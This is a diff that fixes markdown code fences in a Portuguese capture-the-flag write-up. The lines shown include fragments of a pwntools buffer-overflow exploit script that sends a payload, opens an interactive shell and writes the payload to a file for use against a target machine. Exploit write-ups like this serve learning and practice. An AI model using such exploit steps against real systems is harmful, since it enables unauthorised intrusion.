@@ -39,7 +39,7 @@ Sabendo disso, vamos realizar um _overwrite_ dos bytes acima e da função de re
 > p.recvuntil(b"name:")
 > p.sendline(payload)
 > p.interactive()
-> 
+> ```
 ![](first_exploit.jpg)
 
 Conseguimos realizar um **BF** e também obter uma shell  
@@ -56,8 +56,7 @@ Realizamos as seguintes alterações no código
 > 
 > with open("my_payload", "wb") as file:
 >         file.write(payload)
->
-
+> ```
 Com isso, poderemos gerar nosso _payload_ e utilizar ele para obter acesso a máquina-alvo  
 
 ![](flag.jpg)
